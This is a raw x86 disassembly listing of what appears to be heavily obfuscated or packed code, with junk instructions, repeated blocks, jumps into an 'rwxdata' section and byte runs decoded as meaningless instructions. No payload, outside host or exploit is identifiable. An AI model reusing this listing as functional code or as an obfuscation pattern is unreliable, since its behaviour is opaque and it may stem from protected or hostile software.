mov eax 0xdea0dd01
sub_101fff69
push ebp
pushfd
lea esp [ esp + 0xc ]
je rwxdata
bswap bx
pop ebx
lea edi [ eax - 0x4ca17c7c ]
pop edi
xchg si bp
pushad
jmp rwxdata
pushfd
push [ esp ]
call sub_1014c174
mov [ esp ] 0x55
lea esp [ esp + 0xc ]
je rwxdata
mov esi [ esp + 0x20 ]
push 0x8767430c
push [ esp + 0x4 ]
pushfd
pushfd
mov ebp [ esp + 0x34 ]
push [ esp ]
pushfd
pushfd
push [ esp + 0x44 ]
retn 0x50
lea esi [ ebx * 8 + 0x4a13f57e ]
mov bh 0x44
pop esi
movsx di cl
bswap di
mov ebx eax
lea edi [ eax + 0x36287ca4 ]
pop edi
call j_sub_1020b448
aam 0x79
sbb cx 0x59c5
sub ebx ebx
bts cx bp
sets cl
mov [ ebp - 0x4 ] ebx
rcl ecx 0x1d
not cl
bts eax eax
bsf ax ax
mov eax edx
shl ecx 0x13
rcr cl cl
shr eax 0x10
movsx ecx bl
shl cl 0x7
mov ecx [ esi + 0x4 ]
stc
cmp bl 0x38
or ecx ecx
pushad
mov [ esp + 0x4 ] bl
jmp rwxdata
pushad
lea esp [ esp + 0x40 ]
je rwxdata
call sub_10149924
cmp al 0x38
jne rwxdata
int1
pop ebx
mov bl 0x3e
and bh bl
xchg ebp eax
loope rwxdata
int1
out 0xd8 eax
sbb al 0xa2
cmp al 0x86
cmp [ ebp - 0x638ed2cf ] cl
sub_102000b2
clc
add eax edi
pushad
pushfd
mov [ esp + 0xc ] 0xdcaf1569
lea esp [ esp + 0x2c ]
jmp rwxdata
bt dx 0x9
cmp eax edx
pushad
lea esp [ esp + 0x20 ]
jb rwxdata
bswap edx
mov bl 0x5d
xchg si bx
pop edx
call sub_102031b5
add [ eax ] al
inc ebx
outsd
inc ebx
jb rwxdata
cmp bl 0x56
push ebx
call sub_1011eb7e
add [ eax ] al
push edi
push esp
push ebx
inc esi
jb rwxdata
pop edi
sub esi edx
popad
je rwxdata
0x89a9f514 0xc6b5
dec ebp
insd
outsd
jb rwxdata
pop es
div [ edi + 0x8 ]
cdq
add eax 0xe13e1ec1
imul esi esi 0x716726f9
pop ebx
dec eax
pop ecx
jmp rwxdata
dec ecx
outsb
jae rwxdata
xchg edx eax
jne rwxdata
add [ 0xffffffffe0bf3f9f ] bl
loop rwxdata
test [ eax ] 0x19
imul [ eax ]
cmp [ ebx + 0x2b ] edx
les edi [ ss : eax - 0x35 ]
into
push esp
adc ebp [ ebx ]
add ecx [ 0x51f87635 ]
stosb [ edi ]
jns rwxdata
cmp [ edx + ecx * 4 + 0xb96555 ] 0x7e
nop
mov ss [ ebp + 0x6a ]
out dx eax
outsd
xor [ esi + 0x49 ] 0x5a
add [ edi - 0x555d10a8 ] bl
adc dh cl
pop edi
fwait
jae rwxdata
scasd [ edi ]
popad
outsb
arpl [ ebp ] sp
mov [ esp + 0x28 ] 0xa401f29b
pushfd
mov [ esp ] 0xae
push eax
mov [ esp + 0x4 ] 0x311ec6de
lea esp [ esp + 0x30 ]
jmp sub_1020d404
inc ebp
mov eax [ 0xffffffffc281fd3d ]
in al dx
lodsd [ esi ]
cmp [ edx - 0x671a661c ] 0xe6
daa
push edi
push 0xc3978c23
fcom [ ebx - 0x64 ]
and ebx ebp
inc [ eax - 0x17aca905 ]
0xfff141 0x5700
in eax dx
pushad
pop ds
mov bl 0xac
add al 0x2e
sbb dh [ ebp + 0x29 ]
imul edx esi 0x42dd0ef0
imul ebx [ edx - 0x3d021988 ] 0x74
or bh [ ecx + 0x752a5426 ]
dec edx
pop eax
xchg [ edi ] bh
jg rwxdata
stc
movsb [ edi ] [ esi ]
stosd [ edi ]
js rwxdata
mov dh dh
pop es
inc eax
in eax dx
rol [ ebp - 0x7a ] 0xa3
mov esp 0x3de30d00
or eax [ ebx ]
pushfd
dec edi
ror dh 0x1
ror bl 0x1
mov ah 0xe7
cwde
jb rwxdata
pop ds
fld [ 0x7c3107b7 ]
jo rwxdata
popad
fst [ edx ]
xor [ eax ] edx
xlat
mov ebx 0x9d1e0d71
in eax dx
xor eax 0x4c06c5b9
popad
and bl [ ebp - 0x6ac61a67 ]
mov esp 0x7b275797
jge rwxdata
inc [ eax + 0x7f ]
and [ ecx ] dh
iretd
push 0xf409a536
pop edx
les eax [ 0x7b9c93d5 ]
or [ ebx ] ch
sbb ah [ esi - 0x9207809 ]
enter 0x53d9 0x2b
cmp edi 0xffffffdf
xor cl ch
pop ss
dec ebp
or al 0x0
xchg ebp eax
dec edi
iretd
add dh bh
aas
pop ebp
xchg edx ebx
idiv cl
jno rwxdata
mov ecx esp
cmp al 0xc9
push esi
fisttp [ edi ]
xlat
sbb [ edx ] bl
das
push edi
xchg [ eax - 0x7edd3653 ] ebx
mov eax 0x39afa11e
cmpsb [ esi ] [ edi ]
mov [ edi - 0x6ae3f42d ] gs
cmp eax 0xa464c162
rcr ebp cl
retn 0xd271
std
cmp [ ecx + 0x9 ] al
jle rwxdata
sbb si bp
int1
sbb eax 0x5915f001
cmc
test eax 0xbd81b1ad
or eax 0xa145da11
cmp eax 0xf2c281fd
in al dx
mov bh 0x88
mov eax [ 0xcfbc48c ]
in al dx
jmp rwxdata
xchg esi eax
stc
mov edx 0xe9d6e304
xchg ecx eax
pop ebx
call 0xffffffffab376d8d
mov [ ebx - 0x57 ] edx
insd
push ecx
lea esp [ ecx - 0x23 ]
out dx al
jns rwxdata
jecxz rwxdata
xor [ eax ] ebx
daa
jpo rwxdata
sbb ebp edi
shr [ ecx ] cl
aad 0x16
dec esi
mov dl 0x2a
mov ah 0xf5
or dh [ ecx ]
dec esi
cmpsb [ esi ] [ edi ]
pop edi
dec ebp
xchg edx eax

mov esp es
sti
or al 0xec
salc
sub eax [ edx - 0x12158581 ]
push es
push esp
cmp ecx [ ecx - 0x79 ]
push eax

sub_102010f5
sub edi 0x4
cmc
test dl dh
push [ edi ]
pop [ esp + 0x4 ]
push 0x9758484a
cmc
push [ esp ]
cmp edi ebx
lea esp [ esp + 0xc ]
jg rwxdata
pushad
lea esp [ esp + 0x20 ]
ja rwxdata
push esi
lea esp [ esp + 0x4 ]
ja rwxdata
clc
pushfd
clc
call sub_102010f5
rcl edi 0xe7
nop
iretd
dec al
cmp ebp 0x991eea59
sub ebx edi
shl al cl
add ebx esp
ror di 0xc
shld edi esp 0x14
inc al
shld edi edx cl
mov edi ebx
neg al
bt cx dx
mov al 0x33
rcl al 0x4
cmc
dec al
sub ebx edi
shl edi 0xe
inc al
add ebx esp
push ecx
mov edi ebx
setbe al
neg al
rcr al cl
mov al 0x2e
stc
bt cx bp
pushad
push eax
[ edi ]
jmp rwxdata
pop ebx
cmp [ edi ] 0x60
sbb al [ ebp + 0x29 ]
push esi
cwde
xchg [ edi + 0x60 ] ebx
stc
lodsb [ gs : esi ]
jb rwxdata
push eax
loop rwxdata
lea esp [ esp + 0x28 ]
jne rwxdata
mov dl 0x95
test al 0x71
pop ebx
pop ss
insb
and edx [ ebx + 0x4b ]
jae rwxdata
leave
dec edi
loope rwxdata
arpl [ edx ] di
cmp al 0xd2
dec esp
pop es
cmp [ edx + 0x1d ] al
pop esi
pop es
cmp [ ecx + 0x3c ] bh
adc [ edx - 0x4d6b5480 ] 0xffffff95
push edi
pushad
call sub_10201207
not ah
call sub_10115a40
scasd [ edi ]
sahf
rcl [ ebp + 0x2ef031c9 ] 0x3f
dec ebp
mov eax 0xb6550447
inc eax
pop esi
rol [ ecx ] 0x36
cmpsb [ esi ] [ edi ]
lahf
dec [ edx + 0x7f ]
mov al 0x2e
pushad
call sub_101454db
sub [ eax - 0x1b6cd469 ] 0xca558c7b
xchg esp eax
popfd
pop ebx
aas
or [ esi + 0x270cf218 ] eax
cmp dh bh
xor [ ecx - 0x6c ] 0x7
js rwxdata
shl [ eax + 0x4d0c033 ] 0x1
add esp 0xffffff87
pop ss
test al 0x3b
test [ esi - 0x13768fdf ] bl
pop ecx
push eax
push es
ror bl 0x1
inc esi
test [ esi - 0xf ] 0xb4
sub ch [ ebx - 0x2b ]
in eax 0xc2
fadd st2
fmul [ edx ]
mov ch 0xc6
and al 0xfa
adc al 0xa
rcr [ esi + 0x6f ] 0x80
mov edi 0x16318dd0
fnstcw [ ecx - 0x2cf31396 ]
sub_102018d5
shr ebx 0xc
cmc
mov [ esp + 0x8 ] 0xcc
pushad
push [ esp + 0x8 ]
cmp ebx 0x1
jmp rwxdata
jmp rwxdata
push 0x34d95c78
lea esp [ esp + 0x34 ]
je rwxdata
pushad
or bh al
setbe bl
mov bx [ esi ]
mov [ esp ] 0x42fc
and ebx 0xfff
pushad
cmp al ah
add [ ebx + edi ] ax
push 0xfbdac584
push [ esp ]
pushfd
pushfd
lea esp [ esp + 0x50 ]
jmp rwxdata
push 0x8db8606e
pushad
mov [ esp + 0x8 ] ax
test ah bh
cmp ebx 0x2
call sub_1014a977
lea esp [ esp + 0x30 ]
call sub_10144e7a
push 0xc2eb0691
pushad
mov [ esp + 0xc ] al
call sub_10116dfb
sbb edi ebp
dec edi
add al 0x3b
test al 0x17
pop eax
push ecx
int 0xc8
inc edi
xlat
sub al 0x1c
in al 0xbb
pop es
mov bh 0xc3
mov ebx 0xdf80b32b
mov esi 0xc3fc0247
fdivr [ ebx + 0x4 ]
std
sar esi 0xa1
stc
mov eax 0x5cf7f7e6
push edi
dec eax
loope rwxdata
jmp rwxdata
sbb [ ecx + 0x19b95746 ] 0xd354c686
test al 0x13
popfd
add dh [ ecx ]
hlt
add esi 0x2
jmp rwxdata
adc al [ edx + eax * 4 + 0x6d ]
int 0xfa
sbb eax 0xc1de8eb9
sub eax 0x77d1f2c7
dec edx
aaa
js rwxdata
xchg dh al
push esp
shr [ eax + 0x31029d13 ] cl
mov ebp 0xfc31f0ef
stosd [ edi ]
push 0x9282bd96
out dx eax
mov ebx 0x4d325aca
dec esi
xor [ ecx + 0x1144736 ] ebp
idiv [ edx ]
stc
adc [ 0x1e610d92 ] ebp
xchg edx eax
jae rwxdata
pushad
pushad
pushfd
dec ecx
push esi
lea esp [ esp + 0x48 ]
jne rwxdata
mov [ 0x49ec33bb ] eax
cmc
hlt
pop eax
and eax 0x384ab459
xchg [ ebx + 0x49ec33bb ] ah
btc bx 0x8
bswap bx
clc
jmp rwxdata
seto cl
bt bp 0x1
xor cl ah
mov ecx [ ebp - 0x4 ]
pushfd
bt bx 0xc
cmp [ ebp + 0x14 ] ecx
jmp sub_10115b2d
mov bx [ esi ]
pushad
shr ebx 0xc
bt dx 0x6
bt dx cx
cmp ebx 0x1
call sub_1020bc51
movsb [ edi ] [ esi ]
cmp al 0xc2
ror [ esi ] 0x1
sub_10201dfb
mov [ esp ] 0xfe
lea esp [ esp + 0x4 ]
jne rwxdata
stc
call sub_101491f0
pushfd
stosb [ edi ]
push [ esp ]
pushad
pushfd
push [ esp + 0x4 ]
lea esp [ esp + 0x30 ]
jmp sub_101446f5
sub_10201ef0
push ebp
lea esp [ esp + 0x8 ]
jne rwxdata
bt di 0x9
pushad
pushfd
pushad
add ecx 0xffffffff
push 0xb06ce317
jmp sub_10208dbc
lahf
movsx ax cl
push 0x388a479d
pushad
mov eax [ edx + 0x8 ]
pushfd
push ebx
pushfd
push esp
lea esp [ esp + 0x34 ]
jmp rwxdata
pushad
pushad
or ebx ebx
push 0xf46ea48a
push [ esp + 0x8 ]
lea esp [ esp + 0x48 ]
je rwxdata
pushad
mov bh 0xa6
mov edi [ esp + 0x20 ]
jmp sub_10144c23
movzx si al
mov esi eax
movsx ax al
bswap ax
pushad
mov [ esp + 0x1c ] ebx
push [ esp + 0x4 ]
not ax
pushfd
lea eax [ LocalFree@IAT ]
jmp rwxdata
pushad
call sub_102091f3
les esi [ eax - 0x54c3412 ]
or ebx [ esp + esi * 4 ]
inc eax
xchg ebx eax
int3
sub_102020a3
pushad
call sub_1014bea3
insb
je rwxdata
sbb dl bh
xchg ecx eax
push cs
add [ esi ] bl
pop esp
and dh [ edx + ebp ]
sub [ esi ] edx
cmpsd [ esi ] [ edi ]
js rwxdata
je rwxdata
adc [ edi ] 0x88
fsub [ edx ]
aaa
out dx al
xor [ edx + 0x68 ] eax
in al 0x7a
arpl [ ebx - 0x12e7532d ] bx
and al 0xfa
out dx eax
out dx eax
sub al 0x3d
jno rwxdata
out dx al
fldenv [ edi + 0x74ab30af ]
leave
pop ds
mov ebx 0xf26bec22
sub al 0x6d
add al 0x1b
sub al 0xe6
jns rwxdata
xchg ecx eax
mov [ 0x6e58cab4 ] al
mov esi ebp
retn
fld [ 0x3d01ed72 ]
shl [ ebx + 0x4b ] 0x1
adc eax 0x1eda24e9
or [ ebp - 0x63 ] edx
mov eax [ 0xffffffffd727b6a9 ]
sub esi [ ecx + 0x5b ]
shr ecx 0xa6
int1
scasb [ edi ]
adc [ edx ] al
nop
mov eax 0xb807dce2
sahf
ror [ edi - 0x10 ] 0x46
stosb [ edi ]
popad
add [ eax - 0x76 ] ah
dec edi
lea esp [ eax - 0x26 ]
mov al dh
mov al [ 0xa34b09f ]
mov ch 0xea
mov ah 0xcb
pop ds
insd
cwde
mov esp 0x719965f
jle rwxdata
popfd
mov eax [ 0xffffffffca349569 ]
cmp al bh
or eax 0xed7205d9
add [ 0xffffffffa19d9570 ] edi
imul edx [ ebp + 0x66dbca34 ] 0xb575cab9
jbe rwxdata
add dl [ eax + 0x7dce2b8 ]
mov eax 0xf04fc09e
inc esi
into
jecxz rwxdata
jge rwxdata
pop esp
bound edx [ ebx + ebp * 2 - 0x54 ]
std
and [ edx ] ecx
xor esp esp
cmp bl bh
xchg [ ecx + ebx + 0x699e41c6 ] bh
jbe rwxdata
cmpsd [ esi ] [ edi ]
scasd [ edi ]
xor [ ebx - 0x44e0368c ] ch
and ch ah
imul esi edx 0x2c
insd
inc edi
pop eax
cmpsb [ esi ] [ edi ]
salc
pop eax
sbb [ ecx ] esp
0xe5546d59 0xcffc
popfd
frstor [ ecx + 0x578882fd ]
add bl [ edx + ecx * 4 + 0x35 ]
mov edi 0xb3f7f46
push esp
mov ecx 0x39b06e45
movsd [ edi ] [ esi ]
mov ecx 0x37f689e5
jno rwxdata
pop ds
jo rwxdata
add eax 0x3d01ed72
and eax esi
dec edi
das
add [ ebx + 0x6d3170af ] 0x95
mov bl [ ebx + 0x579e8df1 ]
push 0x5bb90fdb
outsd
cwde
xchg [ eax + 0x650e73ab ] ebx
test al 0x8a
jpo rwxdata
sahf
imul esi [ esi - 0x39 ] 0x364b63d1
adc eax 0x1eda24e9
retn 0xb2dd
sub_10202ec8
push [ esp ]
pushfd
mov [ esp + 0x2c ] ebx
pushfd
jmp rwxdata
lea esp [ esp + 0x30 ]
call sub_10144e7a
push 0xc2eb0691
pushad
mov [ esp + 0xc ] al
call sub_10116dfb
sbb edi ebp
dec edi
add al 0x3b
test al 0x17
pop eax
push ecx
int 0xc8
inc edi
xlat
sub al 0x1c
in al 0xbb
pop es
mov bh 0xc3
mov ebx 0xdf80b32b
mov esi 0xc3fc0247
fdivr [ ebx + 0x4 ]
std
sar esi 0xa1
stc
mov eax 0x5cf7f7e6
push edi
dec eax
loope rwxdata
sbb [ ecx + 0x19b95746 ] 0xd354c686
test al 0x13
popfd
add dh [ ecx ]
hlt
adc al [ edx + eax * 4 + 0x6d ]
int 0xfa
sbb eax 0xc1de8eb9
sub eax 0x77d1f2c7
dec edx
aaa
js rwxdata
xchg dh al
push esp
shr [ eax + 0x31029d13 ] cl
mov ebp 0xfc31f0ef
stosd [ edi ]
push 0x9282bd96
out dx eax
mov ebx 0x4d325aca
dec esi
xor [ ecx + 0x1144736 ] ebp
idiv [ edx ]
stc
adc [ 0x1e610d92 ] ebp
xchg edx eax
jae rwxdata
mov [ 0x49ec33bb ] eax
cmc
hlt
pop eax
and eax 0x384ab459
xchg [ ebx + 0x49ec33bb ] ah
sub_10202fa5
pushad
rol al 0x6
stc
cmp bx bx
not al
mov [ esp + 0x4 ] ah
stc
stc
push 0xe8f30604
add al 0xc7
pushfd
cmp al [ edi ]
mov al 0xb4
setbe ah
jmp rwxdata
lea edi [ edi + 0x1 ]
mov [ esp + 0xc ] 0x31
mov eax [ esp + 0x4c ]
mov [ esp ] cx
call sub_1011dfc7
pushad
lea esp [ esp + 0x20 ]
call sub_101ffc63
push eax
lea esp [ esp + 0x4 ]
jae rwxdata
jbe rwxdata
clc
bt di 0x3
xor eax eax
jmp rwxdata
jmp rwxdata
push edx
push 0x8179adcb
lea esp [ esp + 0x8 ]
call sub_10147230
call sub_10147215
pushfd
call sub_1011dfe5
push 0x24df4653
pushfd
lea esp [ esp + 0x8 ]
call sub_101ffc63
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
call sub_10147230
stc
cmp cl ch
sub ecx ebx
jmp rwxdata
push esp
call sub_1011e5a4
jl rwxdata
not al
pushfd
jmp rwxdata
push 0xfd272457
lea esp [ esp + 0x4 ]
jne rwxdata
sbb dl bl
mov eax 0xca55b202
mov edx 0x8510cf90
or ebp edx
jmp sub_10149924
mov dl 0x60
call sub_10118ad3
lea esp [ esp + 0x28 ]
jbe rwxdata
push edx
push edx
xchg ecx eax
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_1014c55d
pushfd
push 0x64680a47
lea esp [ esp + 0x8 ]
jmp rwxdata
movsx dx al
je rwxdata
movsx di dl
shr di cl
sub ecx 0x1
shld si di cl
stc
rol edi 0x3
btr si 0xe
mov [ ebp - 0x4 ] ecx
add di cx
xor ch ah
btr cx 0x4
mov ecx [ ebp - 0x8 ]
cmc
add ecx [ ebp - 0x4 ]
bt dx 0x9
sub si cx
shr ecx 0x1
sbb edi ebp
shl si 0x1
bt cx 0xc
mov edi [ ebx + ecx * 4 ]
movsx si dl
sub si sp
btr si 0x6
add edi eax
not si
mov esi [ ebp + 0xc ]
pushfd
jmp j_sub_10208e7c
jmp rwxdata
xchg ah bl
clc
sub bl 0xbd
mov eax ebp
pushfd
sbb bl bh
mov bl 0x1
sub esp 0xfffffffc
stc
call sub_101491f0
call sub_1014ac34
fcom [ eax + 0xe ]
adc eax 0x7b6a554a
shr [ ebp - 0x20e6b7b7 ] cl
imul edx [ esi + 0x4e78a788 ] 0x886975b0
jge rwxdata
rcl bl cl
adc di 0x7eed
xor eax eax
bswap edx
mov bl 0x5d
xchg si bx
pop edx
call sub_102031b5
add [ eax ] al
inc ebx
outsd
inc ebx
jb rwxdata
pushfd
dec eax
pushfd
shl eax 0x8
not al
push 0x3695820c
pushfd
lodsb [ esi ]
push 0xe3e5c175
cmc
not al
cmc
sub al 0x59
push 0x5d658544
pushfd
neg al
pushad
bt sp 0x6
clc
mov [ esp + 0x4 ] 0x1335
sub al 0x9d
push 0x6a86e1a5
jmp rwxdata
mov [ ebp - 0x3 ] bh
cmp [ esi ] 0x706dd161
popad
pop esi
adc ebp [ ebx ]
xlat
xchg [ ebx - 0x74 ] edx
popfd
out dx eax
pop edi
sub esi edx
popad
je rwxdata
lea esp [ esp + 0x48 ]
call sub_1014c55d
push ecx
push 0x686be2cd
cmp eax 0x7d00
lea esp [ esp + 0x8 ]
jge rwxdata
pop es
div [ edi + 0x8 ]
cdq
add eax 0xe13e1ec1
imul esi esi 0x716726f9
pop ebx
dec eax
pop ecx
jmp rwxdata
dec ecx
outsb
jae rwxdata
pushad
pushfd
mov [ esp + 0x4 ] 0xe3
lea esp [ esp + 0x24 ]
jae rwxdata
jae rwxdata
test [ eax ] 0x19
imul [ eax ]
cmp [ ebx + 0x2b ] edx
les edi [ ss : eax - 0x35 ]
into
push esp
adc ebp [ ebx ]
add ecx [ 0x51f87635 ]
stosb [ edi ]
jns rwxdata
cmp [ edx + ecx * 4 + 0xb96555 ] 0x7e
nop
mov ss [ ebp + 0x6a ]
out dx eax
outsd
xor [ esi + 0x49 ] 0x5a
add [ edi - 0x555d10a8 ] bl
adc dh cl
pop edi
fwait
jae rwxdata
scasd [ edi ]
popad
outsb
arpl [ ebp ] sp
mov [ esp + 0x28 ] 0xa401f29b
pushfd
mov [ esp ] 0xae
push eax
mov [ esp + 0x4 ] 0x311ec6de
lea esp [ esp + 0x30 ]
jmp sub_1020d404
pushad
inc ecx
lea esp [ esp + 0x20 ]
push 0xbfe735f8
inc ecx
add esp 0x4
rcl bl cl
cmc
xchg ebp eax
pushad
call j_sub_1011701f
stosb [ edi ]
enter 0x71ee 0x75
imul edi [ edx + 0x3a ] 0xda6e4938
add eax 0xd185ba99
lea edi [ ecx ]
lds ebp [ ecx - 0x44f02f8a ]
arpl [ eax ] di
inc edi
jmp rwxdata
clc
push 0x496c45e7
jmp sub_10117f5e
stc
movsb [ edi ] [ esi ]
stosd [ edi ]
js rwxdata
mov dh dh
pop es
inc eax
in eax dx
rol [ ebp - 0x7a ] 0xa3
mov esp 0x3de30d00
or eax [ ebx ]
pushfd
dec edi
ror dh 0x1
ror bl 0x1
mov ah 0xe7
cwde
jb rwxdata
pop ds
fld [ 0x7c3107b7 ]
jo rwxdata
sti
inc esp
push ecx
insd
enter 0xa076 0xbe
push edx
insd
push ebp
dec edx
retn
xor cl ch
pop ss
dec ebp
or al 0x0
xchg ebp eax
dec edi
iretd
add dh bh
aas
pop ebp
xchg edx ebx
idiv cl
jno rwxdata
mov ecx esp
cmp al 0xc9
push esi
fisttp [ edi ]
xlat
sbb [ edx ] bl
das
push edi
xchg [ eax - 0x7edd3653 ] ebx
mov eax 0x39afa11e
cmpsb [ esi ] [ edi ]
mov [ edi - 0x6ae3f42d ] gs
cmp eax 0xa464c162
rcr ebp cl
retn 0xd271
xchg esi eax
stc
mov edx 0xe9d6e304
xchg ecx eax
pop ebx
sub_102031b5
mov ebx [ esp + 0x4 ]
xchg si di
pushfd
mov [ esp + 0x8 ] 0x85f5
pushad
mov edi [ esp + 0x2c ]
bswap esi
mov esi [ esp + 0x30 ]
push [ esp ]
mov esp ebp
push esi
movsx bp bl
mov ebp [ esp + 0x4 ]
push 0x892531e8
push [ esp + 0xc ]
retn 0x18
sub_10203389
push [ esp + 0x4 ]
lea esp [ esp + 0x10 ]
jne rwxdata
call sub_101153b8
pushad
mov edi [ edx + 0x24 ]
pushfd
bt ax si
add edi eax
clc
test ax 0x1b82
cmc
movzx ecx [ edi + ecx * 2 ]
shld di dx 0x3
mov edi [ edx + 0x1c ]
pushfd
clc
mov [ esp + 0xc ] si
bt di ax
add edi eax
test cl bl
cmp cl ah
mov [ esp ] 0xfd
bt bp 0xa
mov edi [ edi + ecx * 4 ]
call sub_101443f9
js rwxdata
int 0x6e
xor al 0x7a
pop edi
xor ah [ eax - 0x75cbbf01 ]
clc
xor al 0x4b
jmp rwxdata
or [ esi - 0x7f057a17 ] dl
jno rwxdata
adc ah dh
jmp [ ebp + 0x78 ]
scasd [ edi ]
xchg esp eax
sti
mov ch 0xea
xchg si di
movzx esi [ edx + 0x1a ]
jmp rwxdata
pop edi
pushfd
pop edi
lea esi [ esi + edx + 0x1c ]
bswap di
push 0x67ac3434
mov edi [ ebp + 0x8 ]
push [ esp ]
lea esp [ esp + 0x8 ]
call sub_1011ec0a
call sub_10201ef0
sub_10203d90
pushfd
lea esp [ esp + 0x8 ]
jbe rwxdata
movsx dx al
je rwxdata
and si ax
test ch bl
adc si si
sub ecx 0x1
stc
dec si
shl si 0x3
mov [ ebp - 0x4 ] ecx
call sub_101159e1
pushad
lea esp [ esp + 0x44 ]
je rwxdata
call sub_1014ac34
fcom [ eax + 0xe ]
adc eax 0x7b6a554a
shr [ ebp - 0x20e6b7b7 ] cl
imul edx [ esi + 0x4e78a788 ] 0x886975b0
jge rwxdata
rcl bl cl
adc di 0x7eed
xor eax eax
bswap edx
mov bl 0x5d
xchg si bx
pop edx
call sub_102031b5
add [ eax ] al
inc ebx
outsd
inc ebx
jb rwxdata
btc edi 0xc
not al
xor cl al
mov edi edx
xchg ch al
shrd cx bp cl
ror al 0x1
mov ecx edi
rcr al cl
cmc
mov al [ ecx ]
cmp si 0x4446
pushfd
pushad
mov ah al
clc
cmp bl 0xed
sub al 0xc7
mov [ esp + 0x4 ] dh
cmc
jmp sub_101599d3
bt bx 0xe
push ebx
sub al 0x30
call sub_1015a2e8
mov ecx 0xa49ad727
salc
test al 0xb9
cld
pop eax
das
sbb [ ebx ] ebp
adc al 0x8a
adc al 0x28
sbb [ gs : ebp + 0x69 ] ebp
fimul [ esi ]
mov cl 0x19
cmc
adc [ edx + ebx - 0x5b ] ah
std
stc
mov [ ebp - 0x3 ] bh
cmp [ esi ] 0x706dd161
popad
pop esi
adc ebp [ ebx ]
xlat
xchg [ ebx - 0x74 ] edx
popfd
out dx eax
pop edi
sub esi edx
popad
je rwxdata
pop es
div [ edi + 0x8 ]
cdq
add eax 0xe13e1ec1
imul esi esi 0x716726f9
pop ebx
dec eax
pop ecx
jmp rwxdata
dec ecx
outsb
jae rwxdata
test [ eax ] 0x19
imul [ eax ]
cmp [ ebx + 0x2b ] edx
les edi [ ss : eax - 0x35 ]
into
push esp
adc ebp [ ebx ]
add ecx [ 0x51f87635 ]
stosb [ edi ]
jns rwxdata
cmp [ edx + ecx * 4 + 0xb96555 ] 0x7e
nop
mov ss [ ebp + 0x6a ]
out dx eax
outsd
xor [ esi + 0x49 ] 0x5a
add [ edi - 0x555d10a8 ] bl
adc dh cl
pop edi
fwait
jae rwxdata
scasd [ edi ]
popad
outsb
arpl [ ebp ] sp
mov [ esp + 0x28 ] 0xa401f29b
pushfd
mov [ esp ] 0xae
push eax
mov [ esp + 0x4 ] 0x311ec6de
lea esp [ esp + 0x30 ]
jmp sub_1020d404
stc
movsb [ edi ] [ esi ]
stosd [ edi ]
js rwxdata
mov dh dh
pop es
inc eax
in eax dx
rol [ ebp - 0x7a ] 0xa3
mov esp 0x3de30d00
or eax [ ebx ]
pushfd
dec edi
ror dh 0x1
ror bl 0x1
mov ah 0xe7
cwde
jb rwxdata
pop ds
fld [ 0x7c3107b7 ]
jo rwxdata
xor cl ch
pop ss
dec ebp
or al 0x0
xchg ebp eax
dec edi
iretd
add dh bh
aas
pop ebp
xchg edx ebx
idiv cl
jno rwxdata
mov ecx esp
cmp al 0xc9
push esi
fisttp [ edi ]
xlat
sbb [ edx ] bl
das
push edi
xchg [ eax - 0x7edd3653 ] ebx
mov eax 0x39afa11e
cmpsb [ esi ] [ edi ]
mov [ edi - 0x6ae3f42d ] gs
cmp eax 0xa464c162
rcr ebp cl
retn 0xd271
xchg esi eax
stc
mov edx 0xe9d6e304
xchg ecx eax
pop ebx
sub_10204016
lea esp [ esp + 0x54 ]
call sub_1011ec0a
push esp
push 0x52facb96
lea esp [ esp + 0x8 ]
jno rwxdata
jmp rwxdata
push 0xca5e8f72
lea esp [ esp + 0x4 ]
jne rwxdata
pushad
lea esp [ esp + 0x20 ]
jne rwxdata
bt di 0x9
pushad
pushfd
pushad
add ecx 0xffffffff
push 0xb06ce317
jmp sub_10208dbc
movzx eax bl
movsx eax bl
mov eax [ edx + 0x8 ]
pushad
pushad
lea esp [ esp + 0x40 ]
jmp rwxdata
bswap eax
seto al
mov eax [ edx + 0x8 ]
pushfd
mov [ esp ] dh
pushfd
lea esp [ esp + 0x8 ]
jmp rwxdata
pushad
pushad
or ebx ebx
push 0xf46ea48a
push [ esp + 0x8 ]
lea esp [ esp + 0x48 ]
je rwxdata
pushad
mov bh 0xa6
mov edi [ esp + 0x20 ]
jmp sub_10144c23
movzx si al
mov esi eax
movsx ax al
bswap ax
pushad
mov [ esp + 0x1c ] ebx
push [ esp + 0x4 ]
not ax
pushfd
lea eax [ LocalFree@IAT ]
jmp rwxdata
pushad
call sub_102091f3
les esi [ eax - 0x54c3412 ]
or ebx [ esp + esi * 4 ]
inc eax
xchg ebx eax
int3
sub_1020432a
lea eax [ rwxdata ]
mov [ esp + 0x4 ] 0x92
mov [ esp ] ah
push [ esp + 0x4 ]
call sub_1014b634
dec ebx
xor al 0x61
std
mov eax [ 0x601e0efd ]
outsb
and bl [ ebx - 0x25953ef2 ]
jbe rwxdata
clc
mov [ eax - 0x61 ] 0xc7977b44
nop
out dx eax
and ebx [ ebp - 0x539daeb3 ]
sbb ebp [ esi + 0x74 ]
test eax 0x64a6389f
0xbe60ae57 0x7b43
test al 0xb7
js rwxdata
push ds
pushad
cmp ah [ fs : edx + edi + 0x64 ]
pop esi
inc ecx
int3
jpe rwxdata
bound esp [ ebx - 0x421d2e32 ]
loope rwxdata
xchg edx eax
push 0xffffff8d
das
0x9180bf85 0x92ef
mov ecx 0x43fc2f89
test [ edx + eax * 8 + 0x70 ] bh
into
fcomip st4
rcr esi 0x79
push es
test eax 0x8143fc96
test [ esi + 0x3aac3259 ] al
test [ edi - 0x7b364a38 ] edx
cli
in al dx
push edx
inc eax
pop edi
jo rwxdata
lds esi [ 0x2c171c03 ]
das
jl rwxdata
mov ch [ ebx + edx * 2 - 0x6c ]
mov ebp 0x247a156e
fsubr [ esi - 0x1a ]
jbe rwxdata
push ds
cmp al 0x63
enter 0x17b4 0x8b
0x4a74518d 0x4b33
das
xor dh dh
dec ecx
dec esp
xchg ebx eax
lahf
xor [ ecx + edx * 4 + 0x10 ] 0x8e
add al 0x9b
jbe rwxdata
push ebx
sub al 0x72
or eax 0xc8633c1e
mov ah 0x17
mov ebx [ edx + 0x4a74518d ]
xor ecx [ ebx + 0x2f ]
jpo rwxdata
popad
fcom [ ebp - 0x8 ]
mov bh 0x7c
jecxz rwxdata
cmpsd [ esi ] [ edi ]
xor al 0x16
aam 0xab
pop edx
in al 0xf9
add eax 0x73ab36e9
push edx
insb
mov eax [ 0x50ae6e5d ]
popad
add al 0x3b
cdq
sub cl dh
add ch [ edx + 0x22dac955 ]
fwait
andnps xmm2 xmm6
or al 0xf2
js rwxdata
pop ebp
